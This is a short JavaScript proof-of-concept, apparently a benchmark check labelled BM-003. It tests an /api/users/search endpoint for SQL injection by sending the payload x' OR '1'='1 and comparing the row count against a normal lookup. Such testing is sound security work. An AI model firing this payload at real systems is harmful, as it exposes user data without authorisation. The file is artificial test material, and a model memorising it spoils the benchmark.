'use strict';

const poc = require('./lib/common');

// BM-003: SQL injection in /api/users/search.
poc.run(async function () {
  const token = await poc.login('alice');
  const headers = poc.bearer(token);
  const normal = await poc.request('GET', '/api/users/search?' + poc.query({ name: 'alice' }), { headers: headers });
  poc.control(JSON.parse(normal.body).users.length === 1, 'plain lookup returns one user');
  const injected = await poc.request('GET', '/api/users/search?' + poc.query({ name: "x' OR '1'='1" }), { headers: headers });
  const count = injected.status === 200 ? JSON.parse(injected.body).users.length : 0;
  poc.finish(count > 1, 'injected lookup returned ' + count + ' rows (status ' + injected.status + ')');
});
